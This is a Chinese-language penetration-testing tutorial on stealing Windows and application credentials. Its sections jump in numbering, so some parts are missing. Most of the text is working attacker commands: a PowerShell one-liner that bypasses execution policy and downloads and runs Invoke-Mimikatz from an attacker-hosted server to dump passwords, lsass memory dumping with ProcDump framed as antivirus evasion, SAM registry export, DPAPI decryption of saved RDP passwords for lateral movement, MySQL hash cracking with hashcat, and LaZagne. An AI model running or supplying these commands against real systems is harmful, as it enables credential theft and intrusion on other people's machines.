## 一、使用PowerShell脚本加载Mimikatz 🚀

上一节我们介绍了Mimikatz的本地交互式使用，本节中我们来看看如何通过PowerShell脚本远程加载并执行Mimikatz的功能，这种方式更为灵活且便于在远程会话中操作。

### 1.1 远程加载脚本执行

![](img/5420dad61b54e2231ed725d7806d03ce_34.png)

![](img/5420dad61b54e2231ed725d7806d03ce_36.png)

以下是远程加载并执行Mimikatz PowerShell脚本以获取明文密码的命令：

```powershell
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://your-vps-ip:port/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

![](img/5420dad61b54e2231ed725d7806d03ce_38.png)

**命令解析：**
*   `powershell -exec bypass`: 绕过PowerShell的执行策略限制。
*   `IEX (New-Object Net.WebClient).DownloadString(...)`: 从远程服务器下载指定的PowerShell脚本（`Invoke-Mimikatz.ps1`）并加载到内存中执行。
*   `Invoke-Mimikatz -DumpCreds`: 执行脚本中的`Invoke-Mimikatz`函数，并使用`-DumpCreds`参数来转储系统凭证。

![](img/5420dad61b54e2231ed725d7806d03ce_40.png)

执行后，会列出当前系统上所有可获取的用户哈希值及明文密码。

![](img/5420dad61b54e2231ed725d7806d03ce_42.png)

![](img/5420dad61b54e2231ed725d7806d03ce_44.png)

![](img/5420dad61b54e2231ed725d7806d03ce_46.png)

![](img/5420dad61b54e2231ed725d7806d03ce_48.png)

![](img/5420dad61b54e2231ed725d7806d03ce_50.png)

### 1.2 使用Get-PassHashes脚本

![](img/5420dad61b54e2231ed725d7806d03ce_52.png)

另一个常用的PowerShell脚本是`Get-PassHashes.ps1`，它可以直接获取NTML和LM哈希。

![](img/5420dad61b54e2231ed725d7806d03ce_54.png)

```powershell
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://your-vps-ip:port/Get-PassHashes.ps1')"
```

![](img/5420dad61b54e2231ed725d7806d03ce_56.png)

![](img/5420dad61b54e2231ed725d7806d03ce_58.png)

![](img/5420dad61b54e2231ed725d7806d03ce_60.png)

执行后，会以`用户名:LM哈希:NTML哈希`的格式直接输出结果。

**注意**：在实际环境中，可能需要将脚本托管在自己的服务器上，因为直接访问GitHub链接可能受网络限制。

## 二、其他哈希获取工具 🛠️

除了Mimikatz，还有许多其他工具可以用于获取Windows系统的密码哈希。

### 2.1 WCE (Windows Credentials Editor)

![](img/5420dad61b54e2231ed725d7806d03ce_66.png)

![](img/5420dad61b54e2231ed725d7806d03ce_68.png)

![](img/5420dad61b54e2231ed725d7806d03ce_69.png)

![](img/5420dad61b54e2231ed725d7806d03ce_71.png)

WCE是一款功能强大的哈希管理工具。它是一个独立的可执行文件（`wce.exe`），上传到目标机器后直接运行即可获取哈希。

![](img/5420dad61b54e2231ed725d7806d03ce_73.png)

![](img/5420dad61b54e2231ed725d7806d03ce_75.png)

**使用方法：**
1.  将`wce.exe`上传到目标主机（例如使用Cobalt Strike的`upload`命令或文件管理器）。
2.  在命令行或通过Cobalt Strike的`shell`命令执行：`wce.exe`
3.  工具会直接返回当前用户的哈希值。

### 2.2 PWDump7

![](img/5420dad61b54e2231ed725d7806d03ce_77.png)

PWDump7也是一款常用的哈希导出工具。它执行后会立即关闭窗口，因此需要将输出重定向到文件进行查看。

![](img/5420dad61b54e2231ed725d7806d03ce_79.png)

![](img/5420dad61b54e2231ed725d7806d03ce_81.png)

![](img/5420dad61b54e2231ed725d7806d03ce_83.png)

![](img/5420dad61b54e2231ed725d7806d03ce_85.png)

![](img/5420dad61b54e2231ed725d7806d03ce_88.png)

![](img/5420dad61b54e2231ed725d7806d03ce_90.png)

**使用方法：**
1.  上传`pwdump7.exe`到目标主机。
2.  执行命令：`pwdump7.exe > hashes.txt`
3.  使用`type hashes.txt`命令查看获取到的哈希值，格式通常为`用户名:RID:LM哈希:NTML哈希:::`

### 2.3 通过ProcDump+Mimikatz绕过检测

![](img/5420dad61b54e2231ed725d7806d03ce_96.png)

![](img/5420dad61b54e2231ed725d7806d03ce_98.png)

![](img/5420dad61b54e2231ed725d7806d03ce_99.png)

由于杀毒软件对Mimikatz查杀严格，我们可以使用微软官方工具`ProcDump`（来自Sysinternals套件）来导出`lsass.exe`进程的内存，然后在本地使用Mimikatz进行分析。

![](img/5420dad61b54e2231ed725d7806d03ce_101.png)

![](img/5420dad61b54e2231ed725d7806d03ce_102.png)

**操作步骤：**
1.  在目标机器上使用ProcDump导出lsass进程内存：
    ```cmd
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    ```
2.  将生成的`lsass.dmp`文件下载到本地。
3.  在本地使用Mimikatz加载dump文件并解析密码：
    ```cmd
    mimikatz # sekurlsa::minidump lsass.dmp
    mimikatz # sekurlsa::logonPasswords full
    ```

![](img/5420dad61b54e2231ed725d7806d03ce_104.png)

这种方法利用了微软签名工具，不易被查杀。

![](img/5420dad61b54e2231ed725d7806d03ce_106.png)

![](img/5420dad61b54e2231ed725d7806d03ce_107.png)

### 2.4 从注册表导出哈希

![](img/5420dad61b54e2231ed725d7806d03ce_109.png)

![](img/5420dad61b54e2231ed725d7806d03ce_111.png)

![](img/5420dad61b54e2231ed725d7806d03ce_112.png)

![](img/5420dad61b54e2231ed725d7806d03ce_114.png)

![](img/5420dad61b54e2231ed725d7806d03ce_115.png)

Windows的SAM数据库中存储的密码哈希也保存在注册表中，我们可以从注册表导出后再进行解密。

![](img/5420dad61b54e2231ed725d7806d03ce_117.png)

![](img/5420dad61b54e2231ed725d7806d03ce_118.png)

![](img/5420dad61b54e2231ed725d7806d03ce_119.png)

![](img/5420dad61b54e2231ed725d7806d03ce_121.png)

**操作步骤：**
1.  在目标机器上导出SAM和SYSTEM注册表项：
    ```cmd
    reg save HKLM\SAM sam.hive
    reg save HKLM\SYSTEM system.hive
    ```
2.  将`sam.hive`和`system.hive`文件下载到本地。
3.  使用Mimikatz或`secretsdump.py`（Impacket套件）进行解密：
    *   **使用Mimikatz:**
        ```cmd
        mimikatz # lsadump::sam /sam:sam.hive /system:system.hive
        ```
    *   **使用secretsdump.py:**
        ```bash
        python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
        ```

### 3.2 定位并解密RDP密码文件

当用户勾选“保存凭据”连接RDP时，密码会加密存储在以下位置：
`%appdata%\Microsoft\Credentials\`

![](img/5420dad61b54e2231ed725d7806d03ce_189.png)

![](img/5420dad61b54e2231ed725d7806d03ce_191.png)

**解密步骤：**
1.  **获取Credential文件的GUID和MasterKey：**
    ```cmd
    mimikatz # dpapi::cred /in:"C:\Users\[用户名]\AppData\Roaming\Microsoft\Credentials\[凭据文件]"
    ```
    从输出中记录`guidMasterKey`的值。
2.  **获取对应该GUID的MasterKey：**
    ```cmd
    mimikatz # sekurlsa::dpapi
    ```
    在输出结果中找到与上一步`guidMasterKey`对应的`MasterKey`值。
3.  **使用MasterKey解密Credential文件：**
    ```cmd
    mimikatz # dpapi::cred /in:"C:\Users\[用户名]\AppData\Roaming\Microsoft\Credentials\[凭据文件]" /masterkey:[上一步获取的MasterKey]
    ```
    解密成功后，会显示目标主机、用户名和**明文密码**。

获得明文密码后，即可直接使用该凭证进行RDP连接，实现横向渗透。

## 五、获取MySQL数据库密码 🗄️

![](img/5420dad61b54e2231ed725d7806d03ce_244.png)

![](img/5420dad61b54e2231ed725d7806d03ce_246.png)

![](img/5420dad61b54e2231ed725d7806d03ce_248.png)

在渗透测试中，获取Web服务器的数据库密码至关重要。MySQL的密码哈希存储在数据目录下的`user.MYD`文件中。

### 5.1 定位密码哈希文件

![](img/5420dad61b54e2231ed725d7806d03ce_250.png)

![](img/5420dad61b54e2231ed725d7806d03ce_252.png)

MySQL的用户密码信息主要存在于三个文件中（位于MySQL数据目录，如`C:\ProgramData\MySQL\MySQL Server 5.7\Data\mysql\`）：
*   `user.frm`
*   `user.MYD` **(存储密码哈希的核心文件)**
*   `user.MYI`

![](img/5420dad61b54e2231ed725d7806d03ce_254.png)

### 5.2 提取并解密哈希

![](img/5420dad61b54e2231ed725d7806d03ce_256.png)

![](img/5420dad61b54e2231ed725d7806d03ce_258.png)

![](img/5420dad61b54e2231ed725d7806d03ce_260.png)

![](img/5420dad61b54e2231ed725d7806d03ce_262.png)

1.  **提取哈希值：** 将`user.MYD`文件下载到本地，使用十六进制编辑器（如WinHex）打开。搜索特定模式或使用字符串提取工具找到类似`*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9`的哈希串（这是`root`密码经MySQL 5.x `SHA1(SHA1(password))`算法加密后的结果）。
2.  **解密哈希：**
    *   **在线网站破解：** 将哈希值提交到如`cmd5.com`、`hashes.com`等在线解密网站，查询其明文。
    *   **使用Hashcat破解：**
        ```bash
        hashcat -m 300 -a 3 '6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9' ?a?a?a?a?a?a
        ```
        *   `-m 300`: 指定哈希类型为MySQL4.1/5+。
        *   `-a 3`: 使用暴力破解模式。
    *   **使用John the Ripper破解：** 将哈希保存到文件，使用John进行破解。

## 六、获取常用软件保存密码 💻

许多常用软件（如Xshell、TeamViewer、FileZilla等）会将连接密码加密保存在本地，我们可以使用特定工具进行解密。

### 6.1 使用LaZagne项目

LaZagne是一个功能强大的开源工具，可以恢复计算机上大量软件的密码。

**使用方法：**
1.  下载对应系统的LaZagne可执行文件（如`laZagne.exe`）。
2.  在目标机器上运行，可以获取所有模块的密码：
    ```cmd
    laZagne.exe all
    ```
3.  也可以指定模块，如获取浏览器密码：
    ```cmd
    laZagne.exe browsers
    ```
    获取WiFi密码：
    ```cmd
    laZagne.exe wifi
    ```
